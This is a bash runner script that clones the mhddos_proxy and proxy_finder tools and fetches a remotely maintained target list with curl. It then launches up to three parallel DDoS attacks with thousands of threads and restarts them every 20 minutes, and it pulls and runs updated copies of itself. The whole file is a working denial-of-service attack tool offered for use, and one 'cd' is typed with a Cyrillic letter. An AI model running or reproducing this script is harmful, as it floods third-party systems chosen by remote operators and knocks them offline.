#!/bin/bash

#Just in case kill previous copy of scripts
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with ddos"
taskkill -f -im python.exe
taskkill -f -im python3.8.exe
taskkill -f -im python3.9.exe
taskkill -f -im python3.10.exe
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with ddos killed\033[0;0m\n"

#Installing files into correct directory
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling files into correct directories...\033[0;0m\n"
sleep 3
cd ~
rm -rf mhddos_proxy
rm -rf runner_for_windows
rm -rf proxy_finder
git clone https://github.com/alexnest-ua/runner_for_windows.git
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
git clone https://github.com/porthole-ascend-cinnamon/proxy_finder.git
cd ~/mhddos_proxy
python -m pip install -r requirements.txt
cd ~/proxy_finder
python -m pip install -r requirements.txt
sleep 3
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"

restart_interval="20m"

num_of_copies="${1:-1}"
if [[ "$num_of_copies" == "all" ]];
then	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
	num_of_copies=3
elif ((num_of_copies > 3));
then 
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
	num_of_copies=3
elif ((num_of_copies < 1));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
	num_of_copies=1
elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack\033[0;0m\n"
	num_of_copies=1
fi

threads="${2:-1500}"
if ((threads < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
	threads=1000
elif ((threads > 5000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 5000 threads\033[0;0m\n"
	threads=5000
fi

rpc="${3:-1000}"
if ((rpc < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc(connections)\033[0;0m\n"
	rpc=1000
elif ((rpc > 2500));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 2500 rpc(connections)\033[0;0m\n"
	rpc=2500
fi

debug="${4:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ] && [ "${debug}" != "--vpn" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
	debug="--debug"
fi

vpn="${5:-}"
if [ "${vpn}" != "--vpn" ] && [ "${vpn}" != "" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --vpn\033[0;0m\n"
	vpn="--vpn"
fi

echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
sleep 7s


# Restart attacks and update targets list every 20 minutes
while [ 1 == 1 ]
do	
	cd ~/mhddos_proxy

	num0=$(git pull origin main | grep -P -c 'Already|Уже')
   	echo "$num0"
   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
		sleep 3s
	fi
	
	cd ~/proxy_finder	

	num0=$(git pull origin main | grep -P -c 'Already|Уже')
   	echo "$num0"
   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder"
		sleep 2s
	fi
	
	cd ~/runner_for_windows
   	num=$(git pull origin main | grep -P -c 'Already|Уже')
   	echo "$num"
   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh $num_of_copies $threads $rpc $debug $vpn& # run new downloaded script
		exit 130
	fi
	#
   	sleep 3s
	
   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
	cd ~/proxy_finder
	python finder.py&
	
   	if ((num_of_copies > list_size));
	then 
		random_numbers=$(shuf -i 1-$list_size -n $list_size)
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	fi
	
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
	
	
      
   	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            echo -e "\n I = $i"
            # Filter and only get lines that not start with "#". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
           

            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            echo "python runner.py $cmd_line --rpc $rpc $vpn -t $threads $debug"
            
	    
	    сd ~/mhddos_proxy
            python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
	    
	    
            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   	done
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval...\033[1;0m"
   	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with ddos"
   	taskkill -f -im python.exe
	taskkill -f -im python3.8.exe
	taskkill -f -im python3.9.exe
	taskkill -f -im python3.10.exe
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with ddos killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-2 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
	
done
